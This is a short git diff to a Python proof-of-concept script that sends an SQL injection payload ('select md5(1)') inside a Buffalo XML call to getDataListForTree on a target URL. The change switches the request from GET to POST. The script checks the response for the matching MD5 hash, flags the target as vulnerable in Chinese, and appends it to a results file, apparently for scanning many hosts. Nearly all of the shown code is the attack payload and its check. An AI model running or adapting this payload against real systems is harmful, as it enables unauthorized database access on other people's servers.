@@ -46,7 +46,7 @@ def poc(target):
     }
     data = '<buffalo-call>\r\n<method>getDataListForTree</method>\r\n<string>select md5(1)</string>\r\n</buffalo-call>'
     try:
-        res = requests.get(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
+        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
         if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
             print(f'[+]存在漏洞：{target}')
             with open('result.txt','a',encoding='utf-8') as fp:
